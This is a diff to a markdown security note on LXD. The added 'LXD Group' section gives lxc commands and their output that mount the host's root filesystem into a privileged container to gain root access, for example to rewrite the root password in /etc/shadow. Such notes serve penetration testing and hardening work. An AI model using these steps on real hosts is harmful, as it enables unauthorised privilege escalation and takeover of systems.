@@ -1,4 +1,19 @@
-## LXD {#lxd}
+# LXD
+
+## LXD Group
+
+The lxd group is inherently unsafe, and we can use it to mount the host's filesystem within a subcontainer as follows:
+
+```bash
+ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+Creating test 
+ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+Device whatever added to test 
+ubuntu@ubuntu:~$ lxc start test 
+ubuntu@ubuntu:~$ lxc exec test bash
+```
+
+By doing this we effectively have root permissions.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.
 
 ## Privileged Containers
 
@@ -50,9 +65,9 @@ ICanDoWhatever
 root@ubuntu:/home/ubuntu#
 ```
 
-This can be used quite trivially for container escape, as mounting the root directory in a nested container will mount the hosts container as all lxd commands run on the host.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.
+This can be used quite trivially for container escape, as mounting the root directory in a nested container will mount the hosts container as all lxd commands run on the host.  
 
-References:
+## References:
 
 [https://linuxcontainers.org/lxc/getting-started/](https://linuxcontainers.org/lxc/getting-started/)
 
